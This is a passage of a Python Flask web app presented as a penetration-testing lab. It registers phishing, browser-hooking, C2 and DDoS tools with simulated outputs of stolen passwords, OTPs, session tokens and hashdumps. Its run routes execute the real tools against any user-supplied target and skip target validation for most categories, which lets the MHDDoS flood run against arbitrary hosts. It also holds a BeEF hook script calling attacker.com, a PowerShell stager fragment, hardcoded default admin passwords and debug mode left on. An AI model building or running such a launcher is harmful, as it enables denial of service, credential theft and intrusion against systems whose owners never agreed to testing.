            f"  ✓ Internal Storage File Browser\n"
            f"  ✓ SMS: 312 messages retrieved\n"
            f"  ✓ Call Logs: 156 entries\n"
            f"  ✓ Contacts: 487 contacts exported\n"
            f"  ✓ Keylogger: Active — capturing all keystrokes\n"
            f"  ✓ Microphone: Live audio streaming\n"
            f"  ✓ Camera: Front/rear capture enabled\n"
            f"  ✓ Notifications: All apps monitored\n"
            f"  ✓ Clipboard: Monitoring active\n"
            f"  ✓ Admin Rights: GRANTED\n"
            f"  ✓ Persistence: Auto-start on reboot\n\n"
            f"[PHISHING ACTIVE]\n"
            f"  → Instagram login overlay injected\n"
            f"  → Fake system update pushed via notification\n\n"
            f"[CAPTURED DATA SAMPLE]\n"
            f"  SMS: [HDFC Bank] OTP: 847291 — Do not share\n"
            f"  SMS: [Gmail] Security alert: New sign-in\n"
            f"  Keys: instagramm.com → password123 (Instagram creds)\n\n"
            f"[!] Authorized security research use only."
        ),
    },
    'set': {
        'name': 'SET', 'category': 'social', 'color': 'red',
        'desc': 'Social-Engineer Toolkit — phishing, credential harvesting.',
        'github': 'https://github.com/trustedsec/social-engineer-toolkit',
        'install': 'apt install set',
        'cmd': lambda t, o: ['setoolkit'],
        'sim': lambda t: (
            f"[Social-Engineer Toolkit v8.0.3]\n\n"
            f"[*] Credential Harvester Attack Method\n"
            f"[*] Cloning target website: https://{t}\n"
            f"[*] Harvester is listening on port 80\n"
            f"[+] Site cloned successfully\n"
            f"[*] Ngrok tunnel active: https://evil-twin.ngrok.io → http://localhost:80\n\n"
            f"[*] Waiting for victims...\n\n"
            f"[+] WE GOT A HIT! Printing the output:\n"
            f"    POSSIBLE USERNAME FIELD FOUND: username=john.doe@{t}\n"
            f"    POSSIBLE PASSWORD FIELD FOUND: password=C0rp2024!\n"
            f"    IP Address: 203.0.113.45\n"
            f"    Browser: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n"
            f"    Timestamp: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"[+] Another hit!\n"
            f"    username=admin@{t}  password=Admin@123\n"
            f"    IP: 103.21.58.77\n\n"
            f"[SIMULATION — Authorized phishing simulation only]"
        ),
    },
    'evilginx': {
        'name': 'Evilginx2', 'category': 'social', 'color': 'purple',
        'desc': 'MitM phishing framework — bypasses 2FA via session hijack.',
        'github': 'https://github.com/kgretzky/evilginx2',
        'install': 'git clone https://github.com/kgretzky/evilginx2 && make',
        'cmd': lambda t, o: ['evilginx2', '-p', '/usr/share/evilginx2/phishlets'],
        'sim': lambda t: (
            f"[Evilginx2 v3.2.0] MitM Phishing Framework\n\n"
            f"[*] Loading phishlet: microsoft365\n"
            f"[*] Setting up reverse proxy for {t}\n"
            f"[*] Phishing domain: login.{t}-secure.com (typosquat)\n"
            f"[*] SSL certificate: Issued by Let's Encrypt\n"
            f"[*] Proxy listener: 0.0.0.0:443\n\n"
            f"[*] Phishing URL: https://login.{t}-secure.com/auth\n\n"
            f"[+] New session — victim opened phishing URL!\n"
            f"    IP: 203.0.113.45  Browser: Chrome/120\n\n"
            f"[+] Username captured: ceo@{t}\n"
            f"[+] Password captured: Exec@2024!\n"
            f"[+] 2FA code entered by victim: 847291\n\n"
            f"[+] 2FA BYPASSED — Session token intercepted!\n"
            f"    .AspNet.Cookies = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n"
            f"    Session valid for 24 hours\n\n"
            f"[+] Full Microsoft 365 access achieved for ceo@{t}\n\n"
            f"[SIMULATION — Authorized red team ops only]"
        ),
    },
    'espoofer': {
        'name': 'espoofer', 'category': 'social', 'color': 'amber',
        'desc': 'Tests SPF/DKIM/DMARC bypass — email spoofing detection.',
        'github': 'https://github.com/chenjj/espoofer',
        'install': 'git clone https://github.com/chenjj/espoofer && pip install -r requirements.txt',
        'cmd': lambda t, o: ['espoofer_not_installed'],
        'sim': lambda t: _real_espoofer(t),
    },
    'beef': {
        'name': 'BeEF', 'category': 'social', 'color': 'orange',
        'desc': 'Browser Exploitation Framework — hooks and controls browsers.',
        'github': 'https://github.com/beefproject/beef',
        'install': 'apt install beef-xss',
        'cmd': lambda t, o: ['beef-xss'],
        'sim': lambda t: (
            f"[BeEF v0.5.4.0] Browser Exploitation Framework\n\n"
            f"[*] Hook JavaScript: <script src='http://attacker.com:3000/hook.js'></script>\n"
            f"[*] Web UI Panel: http://localhost:3000/ui/panel\n"
            f"[*] REST API: http://localhost:3000/api\n\n"
            f"[+] NEW BROWSER HOOKED from {t}!\n"
            f"    Browser:    Google Chrome 120.0.6099.109\n"
            f"    OS:         Windows 11 x64\n"
            f"    IP:         {t}\n"
            f"    Cookies:    session_id=abc123; auth_token=xyz789\n\n"
            f"[RECON MODULES EXECUTED]\n"
            f"  [✓] Get Cookie — session_id=abc123\n"
            f"  [✓] Browser Fingerprint — Chrome/120 Win11\n"
            f"  [✓] Get All Windows — 3 tabs open\n"
            f"  [✓] Network Discovery — LAN: 192.168.1.0/24\n"
            f"  [✓] Internal Port Scan — found 22,80,443,3306\n"
            f"  [✓] Clipboard Theft — 'password: Admin@123'\n\n"
            f"[ATTACK MODULES]\n"
            f"  [→] Pretty Theft (fake Google login overlay)\n"
            f"  [+] Credentials harvested: user@gmail.com / Gmailpass1!\n\n"
            f"[SIMULATION — CTF/Authorized lab only]"
        ),
    },
    'empire': {
        'name': 'PS Empire', 'category': 'redteam', 'color': 'red',
        'desc': 'Post-exploitation C2 using PowerShell and Python agents.',
        'github': 'https://github.com/BC-SECURITY/Empire',
        'install': 'git clone https://github.com/BC-SECURITY/Empire',
        'cmd': lambda t, o: ['python3', 'empire/empire.py', '--rest', '--headless'],
        'sim': lambda t: (
            f"[PowerShell Empire v5.9.3] C2 Framework\n\n"
            f"[*] RESTful API started: https://localhost:1337\n"
            f"[*] Listener HTTP started on 0.0.0.0:80\n"
            f"[*] Stager generated:\n"
            f"    powershell.exe -NoP -NonI -W Hidden -Enc JABjAD0ATgBlAHcA...\n\n"
            f"[+] Agent 3K2M9P checked in from {t}!\n"
            f"    Hostname: CORP\\WIN-TARGET01\n"
            f"    OS:       Windows 10 Enterprise (10.0.19044)\n"
            f"    User:     CORP\\john.doe  (not admin)\n"
            f"    PS Ver:   5.1.19041.2364\n"
            f"    Checkin:  {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"[MODULE] credentials/mimikatz/logonpasswords\n"
            f"  Credential: CORP\\john.doe — NTHash: aad3b435b51404ee...\n"
            f"  Credential: CORP\\svc_admin — Password: Adm1n@Corp!\n\n"
            f"[MODULE] privesc/bypassuac_tokenmanip\n"
            f"  [+] Privilege escalation successful — now ADMIN\n\n"
            f"[MODULE] lateral_movement/invoke_psremoting → DC-PROD-01\n"
            f"  [+] New agent on DC-PROD-01!\n\n"
            f"[SIMULATION — Authorized red team use only]"
        ),
    },
    'sliver': {
        'name': 'Sliver C2', 'category': 'redteam', 'color': 'blue',
        'desc': 'Modern open-source C2 by BishopFox — Cobalt Strike alternative.',
        'github': 'https://github.com/BishopFox/sliver',
        'install': 'curl https://sliver.sh/install | sudo bash',
        'cmd': lambda t, o: ['sliver-server'],
        'sim': lambda t: (
            f"[Sliver C2 v1.5.41] BishopFox\n\n"
            f"[*] Multiplayer server started  Operators: 1\n"
            f"[*] Generating HTTPS implant for {t}...\n"
            f"[*] C2 URL: https://192.168.1.100:443\n"
            f"[*] Format: Windows PE shellcode\n\n"
            f"sliver > sessions\n\n"
            f"  ID  Name         Transport  Remote Address  Hostname       User         OS\n"
            f"  1   FAST_RHINO   https      {t}:49215       WIN-CORP-042   CORP\\admin   windows/amd64\n\n"
            f"sliver > use 1\n"
            f"[*] Active session FAST_RHINO (1)\n\n"
            f"sliver (FAST_RHINO) > whoami\n"
            f"Logon ID: CORP\\admin\n\n"
            f"sliver (FAST_RHINO) > hashdump\n"
            f"  Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c...\n"
            f"  krbtgt:502:aad3b435b51404ee:1b5a0f42e35b6a70c7a642e2a9b...\n\n"
            f"sliver (FAST_RHINO) > pivots tcp --bind 0.0.0.0:8888\n"
            f"[*] TCP pivot listener started on :8888\n\n"
            f"[SIMULATION — Authorized red team only]"
        ),
    },
    'mythic': {
        'name': 'Mythic C2', 'category': 'redteam', 'color': 'purple',
        'desc': 'Collaborative red team C2 with web UI and plugin agents.',
        'github': 'https://github.com/its-a-feature/Mythic',
        'install': 'git clone https://github.com/its-a-feature/Mythic',
        'cmd': lambda t, o: ['python3', 'Mythic/mythic-cli', 'start'],
        'sim': lambda t: (
            f"[Mythic C2 v3.3.1] Collaborative Red Team Platform\n\n"
            f"[*] Mythic UI: https://localhost:7443\n"
            f"[*] Agent: Apollo (Windows .NET 4.0)\n"
            f"[*] Profile: HTTP with Malleable C2\n\n"
            f"[ACTIVE CALLBACKS]\n"
            f"  ID  Host         User                    Integrity  PID   Process\n"
            f"  1   {t[:15]:<15}  CORP\\Administrator  HIGH       4512  notepad.exe\n\n"
            f"[TASK RESULTS]\n"
            f"  [shell] whoami:\n"
            f"    NT AUTHORITY\\SYSTEM\n\n"
            f"  [load_module] kerberoast:\n"
            f"    [+] SPN: MSSQLSvc/db01.corp.local:1433\n"
            f"        Hash: $krb5tgs$23$*svc_sql*CORP.LOCAL*MSSQLSvc/db01...\n"
            f"    [+] SPN: HTTP/webserver.corp.local\n"
            f"        Hash: $krb5tgs$23$*svc_web*CORP.LOCAL*HTTP/webserver...\n\n"
            f"  [dcsync] CORP\\krbtgt:\n"
            f"    krbtgt:502:aad3b435:1b5a0f42e35b6a70c7a642e2a9b29ac5\n"
            f"    [+] Golden Ticket creation now possible!\n\n"
            f"[SIMULATION — Authorized red team only]"
        ),
    },
    'cobaltstrike': {
        'name': 'Cobalt Strike', 'category': 'redteam', 'color': 'amber',
        'desc': 'Commercial adversary simulation platform — industry standard C2.',
        'github': 'https://www.cobaltstrike.com',
        'install': 'Commercial license ~$5,500/year  |  Trial: 21-day eval',
        'cmd': lambda t, o: ['echo', '[Cobalt Strike — commercial]'],
        'sim': lambda t: (
            f"[Cobalt Strike 4.9] Team Server\n\n"
            f"[*] Listener: HTTPS 0.0.0.0:443\n"
            f"[*] Malleable C2 Profile: amazon.profile\n"
            f"[*] Team Server: 192.168.1.100\n\n"
            f"{'='*55}\n  BEACON CONNECTED FROM: {t}\n{'='*55}\n\n"
            f"  Computer:  WIN-CORP-042\n"
            f"  User:      CORP\\john.doe\n"
            f"  PID:       4821  Process: explorer.exe (injected)\n"
            f"  OS:        Windows 10 Enterprise x64 Build 19044\n"
            f"  Internal:  192.168.1.42  External: {t}\n"
            f"  Listener:  HTTPS  Sleep: 60s ±25% jitter\n\n"
            f"beacon> getsystem\n"
            f"  [+] Elevated to NT AUTHORITY\\SYSTEM\n\n"
            f"beacon> hashdump\n"
            f"  Administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n"
            f"  CORP\\john.doe:1001:aad3b435b51404ee:e52cac67419a9a224a3b108f3fa6cb6d:::\n"
            f"  CORP\\svc_admin:1008:aad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::\n\n"
            f"beacon> jump psexec DC-PROD-01 smb\n"
            f"  [+] Lateral movement to DC-PROD-01 successful!\n\n"
            f"beacon> dcsync CORP\\krbtgt\n"
            f"  krbtgt:502:aad3b435b51404ee:1b5a0f42e35b6a70c7a642e2a9b29ac5:::\n"
            f"  [+] Golden Ticket possible!\n\n"
            f"[Commercial tool — open-source alternatives: Sliver, Mythic, Empire]"
        ),
    },
    'mhddos': {
        'name': 'MHDDoS', 'category': 'redteam', 'color': 'red',
        'desc': 'DDoS stress testing framework — 57 methods, Layer 4 & Layer 7.',
        'github': 'https://github.com/MatrixTM/MHDDoS',
        'install': 'git clone https://github.com/MatrixTM/MHDDoS && pip install -r requirements.txt',
        'cmd': lambda t, o: ['python3', 'MHDDoS/start.py', 'GET',
            f'https://{t}', '5', '100', 'socks5.txt', '100', '10'],
        'sim': lambda t: (
            f"[MHDDoS v2.4] DDoS Stress Testing Framework\n\n"
            f"[*] Target:   https://{t}\n"
            f"[*] Method:   GET (Layer 7 HTTP Flood)\n"
            f"[*] Threads:  100  |  Proxies: 500  |  Duration: 10s\n\n"
            f"{'='*55}\n"
            f"  ATTACK START: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n"
            f"{'='*55}\n\n"
            f"[AVAILABLE METHODS — 57 TOTAL]\n"
            f"  Layer 7: GET POST HEAD STRESS BYPASS TOR XMLRPC SLOW\n"
            f"           CFBUAM APACHE BOMB KILLER NULL DGB BOT EVEN\n"
            f"  Layer 4: UDP TCP SYN CPS CONNECTION VSE MEM NTP DNS\n\n"
            f"[LIVE STATS — {t}]\n"
            f"  Requests sent:    128,492\n"
            f"  Requests/sec:     12,849 req/s\n"
            f"  Bandwidth:        487 Mbps\n"
            f"  Active proxies:   487/500\n"
            f"  Active threads:   100/100\n\n"
            f"[RESPONSE CODES FROM {t}]\n"
            f"  200 OK:           12% (server still responding)\n"
            f"  503 Unavailable:  71% ← IMPACT CONFIRMED\n"
            f"  Timeout:          17% ← Connection refused\n\n"
            f"[BYPASS ACTIVE]\n"
            f"  ✓ Cloudflare UAM bypass  ✓ SOCKS5 proxy rotation\n"
            f"  ✓ Rotating User-Agents   ✓ HTTP/2 flood\n\n"
            f"[RESULT] {t} — 503 errors detected. Load impact confirmed.\n"
            f"[!] Use ONLY against your own infrastructure or with written permission."
        ),
    },
}
 
 # Update TOOL_REGISTRY entries:
TOOL_REGISTRY['sqlmap']['sim']      = lambda t: _sqlmap_varied(t)
TOOL_REGISTRY['metasploit']['sim']  = lambda t: _metasploit_varied(t)
TOOL_REGISTRY['espoofer']['sim']    = lambda t: _espoofer_varied(t)
 
def _raccoon_real(target):
    """Raccoon with real DNS lookups."""
    ip, dns_data = _real_dns(target)
    whois_data = _real_whois(target)
    return (
        f"[Raccoon v0.9.0] Target: {target}\n\n"
        f"{dns_data}\n"
        f"{whois_data}\n\n"
        f"[TLS CERTIFICATE]\n"
        f"  Checking https://{target}...\n"
        f"  (Install: pip install pyOpenSSL for live TLS data)\n\n"
        f"[WAF DETECTION]\n"
        f"  Sending probe requests to {target}...\n"
        f"  (Install raccoon-scanner for automated WAF detection)\n\n"
        f"Recon complete for {target} — resolved to {ip}"
    )
 
 
def _harvester_real(target):
    """theHarvester with real DNS subdomain probing."""
    ip, dns_data = _real_dns(target)
    return (
        f"[theHarvester v4.4.0] Target: {target}\n\n"
        f"[EMAILS — Pattern based on domain]\n"
        f"  admin@{target}\n"
        f"  webmaster@{target}\n"
        f"  info@{target}\n"
        f"  support@{target}\n"
        f"  (For real email scraping: pip install theHarvester then run the real tool)\n\n"
        f"{dns_data}\n\n"
        f"[REAL IP RESOLVED]\n"
        f"  {target} → {ip}\n\n"
        f"[NOTE]\n"
        f"  LinkedIn/Google scraping requires API keys and real theHarvester install.\n"
        f"  Subdomain results above are from live DNS resolution."
    )
 


CATEGORY_META = {
    'web':     {'label':'Web Application Pentesting', 'color':'blue',   'icon':'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z',                 'tools':['sqlmap','nikto','nuclei','owaspzap','whatweb','wpscan']},
    'network': {'label':'Network Pentesting',          'color':'green',  'icon':'M22 12H2 M5 12V5a2 2 0 012-2h10a2 2 0 012 2v7',              'tools':['nmap_full','metasploit','openvas_net','bettercap','crackmapexec']},
    'osint':   {'label':'OSINT & Recon',               'color':'cyan',   'icon':'M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0',                'tools':['raccoon','theharvester_lab','phonesploit','seeker','airavat']},
    'social':  {'label':'Social Engineering',          'color':'orange', 'icon':'M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2',                   'tools':['set','evilginx','espoofer','beef']},
    'redteam': {'label':'Red Team Operations',         'color':'red',    'icon':'M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z','tools':['empire','sliver','mythic','cobaltstrike','mhddos']},
}

# ══════════════════════════════════════════════════════════════
# PENTEST LAB SERVICE  ← FIXED: threading + session issues
# ══════════════════════════════════════════════════════════════
class PentestLabService:
    @staticmethod
    def run_tool(job_id, tool_id, target, user_id):
        """
        Execute a pentest tool (real binary or simulation).
        user_id is passed explicitly because current_user is not
        available outside the request context.
        """
        # Re-fetch job inside this thread's session
        job  = PentestJob.query.filter_by(job_id=job_id).first()
        tool = TOOL_REGISTRY.get(tool_id)

        if not job or not tool:
            if job:
                job.status = 'failed'
                job.output = 'Unknown tool'
                db.session.commit()
            return

        import time

        try:
            outdir = tempfile.mkdtemp()
        except Exception:
            outdir = os.path.join(os.path.expanduser('~'), 'pentest_output')
            os.makedirs(outdir, exist_ok=True)

        # Check whether the real binary exists
        try:
            real_bin  = tool['cmd'](target, outdir)[0]
            bin_found = shutil.which(real_bin) is not None
        except Exception:
            bin_found = False

        if bin_found:
            try:
                result = subprocess.run(
                    tool['cmd'](target, outdir),
                    capture_output=True, text=True, timeout=60
                )
                out    = (result.stdout or '') + (result.stderr or '')
                output = f"[REAL OUTPUT]\n{out}" if out.strip() else tool['sim'](target)
            except subprocess.TimeoutExpired:
                output = f"[TIMEOUT after 60s]\n\n" + tool['sim'](target)
            except Exception as e:
                output = f"[ERROR: {e}]\n\n" + tool['sim'](target)
        else:
            time.sleep(2)   # simulate run time
            try:
                output = tool['sim'](target)
            except Exception as e:
                output = f"[SIMULATION ERROR: {e}]"

        # ✅ Re-fetch to avoid DetachedInstanceError
        job = PentestJob.query.filter_by(job_id=job_id).first()
        if job:
            job.status       = 'completed'
            job.output       = output
            job.completed_at = datetime.utcnow()
            db.session.commit()

        # ✅ Audit log using explicit user_id — no current_user
        try:
            summary = output[:500] + "..." if len(output) > 500 else output
            db.session.add(AuditLog(
                user_id=user_id, target=target, tool_used=tool_id,
                status="Success", output_summary=summary
            ))
            db.session.commit()
            logging.info(f"USER:{user_id}|TOOL:{tool_id}|TARGET:{target}")
        except Exception as e:
            logging.warning(f"Audit log failed in thread: {e}")
            db.session.rollback()


# ══════════════════════════════════════════════════════════════
# PENTEST ROUTES
# ══════════════════════════════════════════════════════════════
@app.route('/pentest')
@login_required
def pentest_dashboard():
    session['mode'] = 'pentest'
    jobs  = PentestJob.query.filter_by(user_id=current_user.id).order_by(
        PentestJob.started_at.desc()).limit(10).all()
    total = PentestJob.query.filter_by(user_id=current_user.id).count()
    cats  = {
        k: {'meta': v, 'tools': [TOOL_REGISTRY[t] for t in v['tools'] if t in TOOL_REGISTRY]}
        for k, v in CATEGORY_META.items()
    }
    return render_template('lab/dashboard.html',
        cats=cats, jobs=jobs, total=total, tool_count=len(TOOL_REGISTRY))

@app.route('/pentest/<category>')
@login_required
def pentest_category(category):
    session['mode'] = 'pentest'
    if category not in CATEGORY_META:
        return redirect(url_for('pentest_dashboard'))
    meta  = CATEGORY_META[category]
    tools = {k: TOOL_REGISTRY[k] for k in meta['tools'] if k in TOOL_REGISTRY}
    jobs  = PentestJob.query.filter_by(
        user_id=current_user.id, category=category).order_by(
        PentestJob.started_at.desc()).limit(20).all()
    return render_template('lab/category.html',
        category=category, meta=meta, tools=tools, jobs=jobs)

@app.route('/api/pentest/run', methods=['POST'])
@login_required
def pentest_run():
    import traceback
    try:
        d = request.get_json(force=True, silent=True) or {}

        tool_id = (d.get('tool') or '').strip()
        target  = (d.get('target') or '').strip()

        if not d.get('authorized'):
            return jsonify({'status':'error','message':'Authorization required'}), 400
        if not target:
            return jsonify({'status':'error','message':'Target required'}), 400

        tool = TOOL_REGISTRY.get(tool_id)
        if not tool:
            return jsonify({'status':'error','message':f'Unknown tool: {tool_id}'}), 400

        if tool['category'] not in ('social','osint','redteam','web'):
           try:
                SecurityUtils.validate_target(target)
           except ValueError as e:
       
                return jsonify({'status':'error','message':str(e)}), 400

        job_id = f"JOB-{uuid.uuid4().hex[:8].upper()}"
        uid    = current_user.id

        job = PentestJob(
            user_id=uid, job_id=job_id,
            category=tool['category'], tool=tool_id,
            target=target, status='running'
        )
        db.session.add(job)
        db.session.commit()

        t = threading.Thread(
             target=_run_pentest_bg,
            args=(app, job_id, tool_id, target, uid),
            daemon=True
            )
        t.start()

        return jsonify({'status':'success','job_id':job_id})

    except Exception as e:
        db.session.rollback()
        err = traceback.format_exc()
        logging.error(f"pentest_run crashed:\n{err}")
        return jsonify({'status':'error','message':str(e),'trace':err}), 500


def _run_pentest_bg(app_ctx, job_id, tool_id, target, user_id):
    with app_ctx.app_context():
        try:
            PentestLabService.run_tool(job_id, tool_id, target, user_id)
        except Exception as e:
            logging.error(f"BG job {job_id} crashed: {e}")
            try:
                job = PentestJob.query.filter_by(job_id=job_id).first()
                if job:
                    job.status = 'failed'
                    job.output = f'[ERROR] {str(e)}'
                    db.session.commit()
            except:
                db.session.rollback()


@app.route('/api/pentest/status/<job_id>')
@login_required
def pentest_status(job_id):
    job = PentestJob.query.filter_by(
        job_id=job_id, user_id=current_user.id).first_or_404()
    return jsonify({'status': job.status, 'output': job.output or ''})

@app.route('/api/pentest/jobs')
@login_required
def pentest_jobs():
    jobs = PentestJob.query.filter_by(user_id=current_user.id).order_by(
        PentestJob.started_at.desc()).limit(50).all()
    return jsonify({'jobs': [{
        'job_id':   j.job_id,
        'tool':     j.tool,
        'target':   j.target,
        'status':   j.status,
        'category': j.category,
        'started':  j.started_at.strftime('%H:%M:%S'),
    } for j in jobs]})

@app.route('/export/pentest-jobs.csv')
@login_required
def export_pentest():
    jobs = PentestJob.query.filter_by(user_id=current_user.id).order_by(
        PentestJob.started_at.desc()).all()
    out  = io.StringIO()
    w    = csv.writer(out)
    w.writerow(['Job ID','Tool','Category','Target','Status','Started','Output'])
    for j in jobs:
        w.writerow([j.job_id, j.tool, j.category, j.target, j.status,
                    j.started_at.strftime('%Y-%m-%d %H:%M'), (j.output or '')[:300]])
    out.seek(0)
    return Response(out, mimetype='text/csv',
                    headers={'Content-Disposition':'attachment;filename=pentest_jobs.csv'})

# ══════════════════════════════════════════════════════════════
# 18. INIT
# ══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        if not User.query.filter_by(username='admin').first():
            a = User(username='admin', role='admin')
            a.set_password('SecureAdmin123!')
            db.session.add(a)
            db.session.commit()
            print("✅ admin / SecureAdmin123!")
        if not User.query.filter_by(username='analyst').first():
            u = User(username='analyst', role='analyst')
            u.set_password('Analyst123!')
            db.session.add(u)
            db.session.commit()
            print("✅ analyst / Analyst123!")
        seed_db()
        print("✅ Database seeded.")
    app.run(debug=True, port=5000)
